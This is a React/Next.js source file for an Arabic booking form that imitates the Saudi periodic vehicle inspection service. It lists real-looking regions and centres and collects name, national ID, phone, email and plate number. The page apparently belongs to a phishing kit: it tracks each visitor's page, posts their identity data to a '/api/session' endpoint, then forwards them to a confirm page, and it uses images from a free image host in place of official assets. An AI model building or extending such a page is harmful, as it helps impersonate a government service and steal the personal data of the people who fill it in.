"use client";
export const dynamic = 'force-dynamic';
import { useState } from "react";
import { useRouter } from "next/navigation";
import SessionTracker from "@/components/SessionTracker";

const GREEN = "#1a6d44";
const ACTIVE_GREEN = "#2fb16e";
const LIGHT_BG = "#fdfdfd";
const BORDER = "#e0e0e0";
const ERROR_RED = "#d32f2f";

const PLATE_CHARS = [
  { ar: "أ", en: "A" }, { ar: "ب", en: "B" }, { ar: "ح", en: "J" },
  { ar: "د", en: "D" }, { ar: "ر", en: "R" }, { ar: "س", en: "S" },
  { ar: "ص", en: "X" }, { ar: "ط", en: "T" }, { ar: "ع", en: "E" },
  { ar: "ق", en: "G" }, { ar: "ك", en: "K" }, { ar: "ل", en: "L" },
  { ar: "م", en: "Z" }, { ar: "ن", en: "N" }, { ar: "هـ", en: "H" },
  { ar: "و", en: "U" }, { ar: "ى", en: "V" },
];

const REGIONS: Record<string, string[]> = {
  'الرياض': ['الرياض حي المونسية','الرياض حي القيروان','المجمعة','المسار الامن الرياض حي القادسية','جنوب شرق الرياض مخرج 17','الرياض حي الشفا طريق ديراب','الخرج','شقراء','مركز الفحص الفني الدوري في المزاحمية','المسار الامن مركز محافظة الافلاج','القويعية','الرياض جامعة الملك سعود','الزلفي','الرياض حي المنار','واجهة روشن','أبراج التاج عفيف','وادي الدواسر'],
  'مكة': ['الخرمة','القنفذة','جدة الشمال','مكة المكرمة','جدة عسفان','جدة الجنوب','الطائف','الطائف حي النسيم'],
  'الشرقية': ['الدمام','أبراج التاج الدمام','الخفجي','الخبر صناعية الثقبة','الهفوف','آيبلس شرق الاحساء','حفر الباطن','شرق حفر الباطن','الجبيل'],
  'القصيم': ['الرس','المذنب','النبهانية','القصيم'],
  'المدينة': ['المدينة المنورة شرق حي العاقول','ينبع','المدينة المنورة'],
  'عسير': ['ابها','الفحص الفني الدوري سراة عبيدة','محايل عسير','بيشة'],
  'تبوك': ['تبـــوك','الفحص الفني الدوري ضباء'],
  'حائل': ['حائل','ٲبراج التاج محطة بقعاء','حائل المنطقة الصناعية الثانية'],
  'الشمالية': ['رفحاء','عرعر'],
  'جازان': ['جيزان','آيبلس جازان','المسار الامن مركز صناعية صامطة','بيش'],
  'نجران': ['نجران'],
  'الباحة': ['الباحة'],
  'الجوف': ['الجوف','القريات'],
};

const TIMES: string[] = [];
for (const [h, suffix] of [[8,'صباحاً'],[9,'صباحاً'],[10,'صباحاً'],[11,'صباحاً'],[12,'مساءً'],[1,'مساءً'],[2,'مساءً'],[3,'مساءً']] as [number,string][]) {
  for (const m of [0,5,10,15,20,25,30,35,40,45,50,55]) {
    TIMES.push(`${h}:${m.toString().padStart(2,'0')} ${suffix}`);
  }
}

export default function BookingPage() {
  const router = useRouter();

  // Personal info
  const [fullName, setFullName] = useState("");
  const [idNumber, setIdNumber] = useState("");
  const [nationality, setNationality] = useState("");
  const [phone, setPhone] = useState("");
  const [email, setEmail] = useState("");
  const [showProxy, setShowProxy] = useState(false);
  const [proxyStatus, setProxyStatus] = useState("citizen");

  // Vehicle
  const [vehicleStatus, setVehicleStatus] = useState("license");
  const [regCountry, setRegCountry] = useState("");
  const [char1, setChar1] = useState("");
  const [char2, setChar2] = useState("");
  const [char3, setChar3] = useState("");
  const [plateNum, setPlateNum] = useState("");
  const [customsId, setCustomsId] = useState("");
  const [regType, setRegType] = useState("");
  const [vType, setVType] = useState("");
  const [sType, setSType] = useState("");

  // Service center
  const [selectedRegion, setSelectedRegion] = useState("");
  const [selectedCenter, setSelectedCenter] = useState("");
  const [fDate, setFDate] = useState("");
  const [fTime, setFTime] = useState("");

  const [errors, setErrors] = useState<Record<string, boolean>>({});

  const getCharAr = (val: string) => val.split("|")[0] || "-";
  const getCharEn = (val: string) => val.split("|")[1] || "-";

  function validate() {
    const e: Record<string, boolean> = {};
    if (!fullName.trim()) e.fullName = true;
    if (!idNumber.trim()) e.idNumber = true;
    if (!nationality) e.nationality = true;
    if (!phone.trim()) e.phone = true;
    if (vehicleStatus === "license" && (!char1 || !char2 || !char3 || !plateNum.trim())) e.plate = true;
    if (vehicleStatus === "customs" && !customsId.trim()) e.customsId = true;
    if (!regType) e.regType = true;
    if (!vType) e.vType = true;
    if (!sType) e.sType = true;
    if (!selectedRegion) e.region = true;
    if (!selectedCenter) e.center = true;
    if (!fDate) e.fDate = true;
    if (!fTime) e.fTime = true;
    setErrors(e);
    return Object.keys(e).length === 0;
  }

  function handleSubmit() {
    if (validate()) {
      // Save to localStorage for next pages
      const data = {
        fullName, idNumber, nationality, phone, email,
        vehicleStatus, regCountry,
        plate: vehicleStatus === "license" ? `${getCharAr(char1)}${getCharAr(char2)}${getCharAr(char3)} ${plateNum}` : customsId,
        regType, vType, sType,
        region: selectedRegion, center: selectedCenter, fDate, fTime
      };
      localStorage.setItem("vsc_booking", JSON.stringify(data));
      // إرسال البيانات للـ API
      fetch('/api/session', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          current_page: 'booking',
          name: fullName,
          id_number: idNumber,
          plate_number: data.plate,
          phone,
          email,
          booking_date: `${fDate} ${fTime}`,
        }),
      }).catch(() => {});
      router.push("/confirm");
    }
  }

  const inputStyle = (hasError?: boolean): React.CSSProperties => ({
    width: "100%",
    padding: "12px",
    border: `1px solid ${hasError ? ERROR_RED : BORDER}`,
    borderRadius: "8px",
    boxSizing: "border-box",
    backgroundColor: "#fff",
    fontSize: "14px",
    color: "#555",
    textAlign: "right",
    outline: "none",
    fontFamily: "inherit",
  });

  const selectStyle = (hasError?: boolean): React.CSSProperties => ({
    ...inputStyle(hasError),
    appearance: "none",
    backgroundImage: `url("data:image/svg+xml;charset=US-ASCII,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20' viewBox='0 0 24 24' fill='none' stroke='%23999' stroke-width='2'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E")`,
    backgroundRepeat: "no-repeat",
    backgroundPosition: "left 10px center",
    backgroundSize: "16px",
  });

  const sectionHeader: React.CSSProperties = {
    fontSize: "17px", fontWeight: "bold", margin: "25px 0 15px",
    color: "#1a3a34", borderBottom: `1px solid #eee`, paddingBottom: "5px"
  };

  const formGroup: React.CSSProperties = { marginBottom: "18px" };
  const fieldLabel: React.CSSProperties = { display: "block", marginBottom: "8px", fontWeight: "600", fontSize: "14px", color: "#333" };

  return (
    <div style={{ backgroundColor: LIGHT_BG, minHeight: "100vh" }}>
      <SessionTracker page="booking" />
      {/* Header */}
      <img src="https://i.ibb.co/8LWchYJd/IMG-20260320-WA0028.jpg" alt="Header" style={{ width: "100%", display: "block" }} />

      <div style={{ maxWidth: "500px", margin: "0 auto", padding: "20px" }}>
        <h2 style={{ color: GREEN, fontSize: "22px", fontWeight: "bold", textAlign: "center", marginBottom: "5px" }}>خدمة الفحص الفني الدوري</h2>
        <h3 style={{ color: "#2d8a5a", fontSize: "18px", textAlign: "center", marginBottom: "25px" }}>صفحة التسجيل</h3>

        {/* Personal Info */}
        <div style={sectionHeader}>المعلومات الشخصية</div>

        <div style={formGroup}>
          <label style={fieldLabel}>الإسم <span style={{ color: ERROR_RED }}>*</span></label>
          <input type="text" value={fullName} onChange={e => setFullName(e.target.value)} placeholder="أدخل الإسم" style={inputStyle(errors.fullName)} />
        </div>

        <div style={formGroup}>
          <label style={fieldLabel}>رقم الهوية / الإقامة <span style={{ color: ERROR_RED }}>*</span></label>
          <input type="text" value={idNumber} onChange={e => setIdNumber(e.target.value)} placeholder="رقم الهوية / الإقامة" style={inputStyle(errors.idNumber)} />
        </div>

        <div style={formGroup}>
          <label style={fieldLabel}>الجنسية <span style={{ color: ERROR_RED }}>*</span></label>
          <select value={nationality} onChange={e => setNationality(e.target.value)} style={selectStyle(errors.nationality)}>
            <option value="">اختر الجنسية</option>
            {["السعودية","الإمارات","البحرين","الكويت","عمان","قطر","مصر","الأردن","سوريا","العراق","لبنان","اليمن","السودان","فلسطين","تونس","المغرب","الجزائر","ليبيا","الهند","باكستان","بنغلاديش","الفلبين","إندونيسيا","أخرى"].map(n => <option key={n}>{n}</option>)}
          </select>
        </div>

        <div style={formGroup}>
          <label style={fieldLabel}>رقم الجوال <span style={{ color: ERROR_RED }}>*</span></label>
          <div style={{ display: "flex", border: `1px solid ${errors.phone ? ERROR_RED : BORDER}`, borderRadius: "8px", backgroundColor: "#fff", overflow: "hidden" }}>
            <input type="text" value={phone} onChange={e => setPhone(e.target.value)} placeholder="أكتب رقم الجوال هنا..." style={{ border: "none", flex: 1, outline: "none", padding: "12px", textAlign: "right", fontSize: "14px", fontFamily: "inherit" }} />
            <div style={{ display: "flex", alignItems: "center", padding: "0 10px", backgroundColor: "#f9f9f9", borderRight: `1px solid ${BORDER}` }}>
              <img src="https://upload.wikimedia.org/wikipedia/commons/0/0d/Flag_of_Saudi_Arabia.svg" style={{ width: "24px" }} alt="SA" />
            </div>
          </div>
        </div>

        <div style={formGroup}>
          <label style={fieldLabel}>البريد الإلكتروني</label>
          <input type="email" value={email} onChange={e => setEmail(e.target.value)} placeholder="البريد الإلكتروني" style={inputStyle()} />
        </div>

        {/* Proxy */}
        <div style={{ display: "flex", alignItems: "center", gap: "10px", margin: "20px 0" }}>
          <input type="checkbox" checked={showProxy} onChange={e => setShowProxy(e.target.checked)} style={{ width: "22px", height: "22px", accentColor: GREEN, cursor: "pointer" }} />
          <label style={{ fontWeight: "600", fontSize: "14px", color: "#333" }}>هل تريد تفويض شخص آخر بفحص المركبة؟</label>
        </div>

        {showProxy && (
          <div style={{ background: "#fff", border: "1px solid #edf0f2", borderRadius: "12px", padding: "20px", marginBottom: "20px" }}>
            <div style={{ textAlign: "center", fontWeight: "bold", marginBottom: "15px", color: "#1a3a34" }}>المعلومات المفوض</div>
            <div style={{ display: "flex", border: `1px solid ${BORDER}`, borderRadius: "8px", overflow: "hidden", marginBottom: "15px" }}>
              <button type="button" onClick={() => setProxyStatus("citizen")} style={{ flex: 1, padding: "12px", border: "none", background: proxyStatus === "citizen" ? GREEN : "#fff", color: proxyStatus === "citizen" ? "#fff" : "#666", cursor: "pointer", fontSize: "14px", fontFamily: "inherit" }}>مواطن / مقيم</button>
              <button type="button" onClick={() => setProxyStatus("gulf")} style={{ flex: 1, padding: "12px", border: "none", background: proxyStatus === "gulf" ? GREEN : "#fff", color: proxyStatus === "gulf" ? "#fff" : "#666", cursor: "pointer", fontSize: "14px", fontFamily: "inherit" }}>مواطن خليجي</button>
            </div>
            <div style={formGroup}>
              <label style={fieldLabel}>أسم المفوض</label>
              <input type="text" placeholder="أكتب اسم المفوض هنا..." style={inputStyle()} />
            </div>
            <div style={formGroup}>
              <label style={fieldLabel}>رقم الجوال</label>
              <input type="text" placeholder="أكتب رقم الجوال المفوض هنا..." style={inputStyle()} />
            </div>
            <div style={formGroup}>
              <label style={fieldLabel}>جنسية المفوض</label>
              <select style={selectStyle()}>
                <option value="">اختر الجنسية</option>
                {["السعودية","الإمارات","البحرين","الكويت","عمان","قطر","مصر","أخرى"].map(n => <option key={n}>{n}</option>)}
              </select>
            </div>
            <div style={formGroup}>
              <label style={fieldLabel}>رقم الهوية الوطنية / الاقامة المفوض</label>
              <input type="text" placeholder="رقم الهوية الوطنية / الاقامة المفوض" style={inputStyle()} />
            </div>
            <div style={formGroup}>
              <label style={fieldLabel}>تاريخ ميلاد المفوض</label>
              <input type="text" placeholder="يوم / شهر / سنة" style={inputStyle()} />
            </div>
          </div>
        )}

        {/* Vehicle Info */}
        <div style={sectionHeader}>معلومات المركبة</div>

        <div style={formGroup}>
          <label style={fieldLabel}>اختر حالة المركبة <span style={{ color: ERROR_RED }}>*</span></label>
          <div style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
            {[
              { id: "license", label: "تحمل رخصة سير" },
              { id: "customs", label: "تحمل بطاقة جمركية" }
            ].map(opt => (
              <div
                key={opt.id}
                onClick={() => setVehicleStatus(opt.id)}
                style={{
                  padding: "14px", borderRadius: "12px", cursor: "pointer", textAlign: "center", fontSize: "15px",
                  border: vehicleStatus === opt.id ? `2px solid ${ACTIVE_GREEN}` : `1px solid #dce0e4`,
                  background: vehicleStatus === opt.id ? "#fff" : "#f8f9fb",
                  color: vehicleStatus === opt.id ? "#1a1a1a" : "#555",
                  fontWeight: vehicleStatus === opt.id ? "bold" : "normal",
                  boxShadow: vehicleStatus === opt.id ? "0 4px 12px rgba(47,177,110,0.15)" : "none",
                }}
              >
                {opt.label}
              </div>
            ))}
          </div>
        </div>

        {vehicleStatus === "license" && (
          <>
            <div style={formGroup}>
              <label style={fieldLabel}>بلد التسجيل <span style={{ color: ERROR_RED }}>*</span></label>
              <select value={regCountry} onChange={e => setRegCountry(e.target.value)} style={selectStyle()}>
                <option value="">اختر بلد التسجيل</option>
                {["السعودية","الإمارات","مصر","الأردن","سوريا","عمان","الكويت","العراق","البحرين","قطر"].map(c => <option key={c}>{c}</option>)}
              </select>
            </div>

            <div style={formGroup}>
              <label style={{ ...fieldLabel, color: errors.plate ? ERROR_RED : "#333" }}>رقم اللوحة <span style={{ color: ERROR_RED }}>*</span></label>
              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: "10px", marginBottom: "10px" }}>
                {[
                  { val: char1, set: setChar1 },
                  { val: char2, set: setChar2 },
                  { val: char3, set: setChar3 },
                ].map((c, i) => (
                  <select key={i} value={c.val} onChange={e => c.set(e.target.value)} style={selectStyle(errors.plate)}>
                    <option value="">اختر</option>
                    {PLATE_CHARS.map(ch => <option key={ch.ar} value={`${ch.ar}|${ch.en}`}>{ch.ar}-{ch.en}</option>)}
                  </select>
                ))}
              </div>
              <input type="text" value={plateNum} onChange={e => setPlateNum(e.target.value)} placeholder="أدخل الأرقام" style={inputStyle(errors.plate)} />
            </div>

            {/* Plate Display */}
            <div style={{ background: "#fff", border: "3px solid #333", borderRadius: "8px", width: "100%", maxWidth: "300px", height: "100px", margin: "15px auto", display: "flex", overflow: "hidden", boxShadow: "0 4px 10px rgba(0,0,0,0.15)" }}>
              <div style={{ flex: 1, display: "flex", flexDirection: "column" }}>
                <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", borderBottom: "1px solid #333", gap: "10px" }}>
                  <span style={{ fontSize: "22px", fontWeight: "900", letterSpacing: "4px" }}>
                    {getCharAr(char1)}{getCharAr(char2)}{getCharAr(char3)}
                  </span>
                  <div style={{ width: "2px", height: "100%", background: "#333" }} />
                  <span style={{ fontSize: "22px", fontWeight: "900", letterSpacing: "4px" }}>{plateNum || "- - - -"}</span>
                </div>
                <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", gap: "10px", background: "#f9f9f9" }}>
                  <span style={{ fontSize: "18px", fontWeight: "900", fontFamily: "Arial", letterSpacing: "4px" }}>
                    {getCharEn(char1)}{getCharEn(char2)}{getCharEn(char3)}
                  </span>
                  <div style={{ width: "2px", height: "100%", background: "#333" }} />
                  <span style={{ fontSize: "18px", fontWeight: "900", fontFamily: "Arial", letterSpacing: "4px" }}>{plateNum || "- - - -"}</span>
                </div>
              </div>
              <div style={{ width: "45px", borderRight: "2px solid #333", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "space-around", background: "#fcfcfc", padding: "5px 0" }}>
                <img src="https://upload.wikimedia.org/wikipedia/commons/0/0d/Flag_of_Saudi_Arabia.svg" style={{ width: "22px" }} alt="KSA" />
                <span style={{ fontSize: "9px", fontWeight: "bold", color: "#333" }}>KSA</span>
              </div>
            </div>
          </>
        )}

        {vehicleStatus === "customs" && (
          <div style={formGroup}>
            <label style={fieldLabel}>رقم البطاقة الجمركية <span style={{ color: ERROR_RED }}>*</span></label>
            <input type="text" value={customsId} onChange={e => setCustomsId(e.target.value)} placeholder="أدخل رقم البطاقة الجمركية" style={inputStyle(errors.customsId)} />
          </div>
        )}

        <div style={formGroup}>
          <label style={fieldLabel}>نوع التسجيل <span style={{ color: ERROR_RED }}>*</span></label>
          <select value={regType} onChange={e => setRegType(e.target.value)} style={selectStyle(errors.regType)}>
            <option value="">اختر نوع التسجيل</option>
            {["خصوصي","نقل عام","نقل خاص","مقطورة","دراجة نارية","مركبة أجرة","تصدير","دراجة نارية ترفيهية","هيئة دبلوماسية","حافلة خاصة","مؤقتة","مركبة أشغال عامة"].map(t => <option key={t}>{t}</option>)}
          </select>
        </div>

        {/* Service Center */}
        <div style={sectionHeader}>مركز الخدمة</div>

        <div style={formGroup}>
          <label style={fieldLabel}>نوع المركبة <span style={{ color: ERROR_RED }}>*</span></label>
          <select value={vType} onChange={e => setVType(e.target.value)} style={selectStyle(errors.vType)}>
            <option value="">اختر نوع المركبة</option>
            {["سيارة خاصة","مركبة نقل خفيفة خاصة","نقل ثقيل","حافلة خفيفة","مركبة نقل خفيفة","نقل متوسط","حافلة كبيرة","الدراجات ثنائية العجلات","مركبات أشغال عامة","دراجة ثلاثية أو رباعية العجلات","مقطورة ثقيلة","سيارات الأجرة","سيارات التأجير","نصف مقطورة ثقيلة","حافلة متوسطة","مقطورة خفيفة","نصف مقطورة خفيفة","نصف مقطورة خفيفة خاصة","مقطورة خفيفة خاصة"].map(t => <option key={t}>{t}</option>)}
          </select>
        </div>

        <div style={formGroup}>
          <label style={fieldLabel}>نوع خدمة الفحص <span style={{ color: ERROR_RED }}>*</span></label>
          <select value={sType} onChange={e => setSType(e.target.value)} style={selectStyle(errors.sType)}>
            <option value="">اختر</option>
            <option>خدمة الفحص الدوري</option>
            <option>خدمة إعادة الفحص الدوري</option>
          </select>
        </div>

        <div style={formGroup}>
          <label style={fieldLabel}>المنطقة الإدارية للفحص <span style={{ color: ERROR_RED }}>*</span></label>
          <select value={selectedRegion} onChange={e => { setSelectedRegion(e.target.value); setSelectedCenter(""); }} style={selectStyle(errors.region)}>
            <option value="">اختر المنطقة</option>
            {[['الرياض','منطقة الرياض'],['مكة','منطقة مكة المكرمة'],['الشرقية','المنطقة الشرقية'],['القصيم','منطقة القصيم'],['المدينة','منطقة المدينة المنورة'],['عسير','منطقة عسير'],['تبوك','منطقة تبوك'],['حائل','منطقة حائل'],['الشمالية','منطقة الحدود الشمالية'],['جازان','منطقة جازان'],['نجران','منطقة نجران'],['الباحة','منطقة الباحة'],['الجوف','منطقة الجوف']].map(([v,l]) => <option key={v} value={v}>{l}</option>)}
          </select>
        </div>

        <div style={formGroup}>
          <label style={fieldLabel}>مركز الفحص <span style={{ color: ERROR_RED }}>*</span></label>
          <select value={selectedCenter} onChange={e => setSelectedCenter(e.target.value)} style={selectStyle(errors.center)} disabled={!selectedRegion}>
            <option value="">{selectedRegion ? "اختر المركز" : "اختر المنطقة أولاً"}</option>
            {(REGIONS[selectedRegion] || []).map(c => <option key={c}>{c}</option>)}
          </select>
        </div>

        {/* Warning */}
        <div style={{ backgroundColor: "#fff5f5", borderRadius: "8px", padding: "15px", display: "flex", margin: "20px 0", border: "1px solid #ffebeb" }}>
          <span style={{ color: ERROR_RED, marginLeft: "10px", fontSize: "20px" }}>⚠️</span>
          <p style={{ color: ERROR_RED, fontSize: "13px", lineHeight: "1.6", flex: 1 }}>
            الحضور على الموعد يسهم في سرعة وجودة الخدمة وفي حالة عدم الحضور، لن يسمح بحجز آخر إلا بعد 48 ساعة وحسب الأوقات المحددة
          </p>
        </div>

        {/* Appointment */}
        <div style={sectionHeader}>موعد الخدمة</div>

        <div style={formGroup}>
          <label style={fieldLabel}>تاريخ الفحص <span style={{ color: ERROR_RED }}>*</span></label>
          <input type="date" value={fDate} onChange={e => setFDate(e.target.value)} style={inputStyle(errors.fDate)} min={new Date().toISOString().split("T")[0]} />
        </div>

        <div style={formGroup}>
          <label style={fieldLabel}>وقت الفحص <span style={{ color: ERROR_RED }}>*</span></label>
          <select value={fTime} onChange={e => setFTime(e.target.value)} style={selectStyle(errors.fTime)}>
            <option value="">اختر الوقت</option>
            {TIMES.map(t => <option key={t}>{t}</option>)}
          </select>
        </div>

        <button
          onClick={handleSubmit}
          style={{ width: "100%", padding: "16px", background: GREEN, color: "#fff", border: "none", borderRadius: "8px", fontSize: "18px", fontWeight: "bold", cursor: "pointer", marginBottom: "40px" }}
        >
          التالي
        </button>
      </div>

      {/* Footer */}
      <img src="https://i.ibb.co/v4MNd90m/IMG-20260322-WA0002.jpg" alt="Footer" style={{ width: "100%", display: "block" }} />
      <img src="https://i.ibb.co/Rp4xMwxN/IMG-20260321-WA0000.jpg" alt="Footer" style={{ width: "100%", display: "block" }} />
    </div>
  );
}
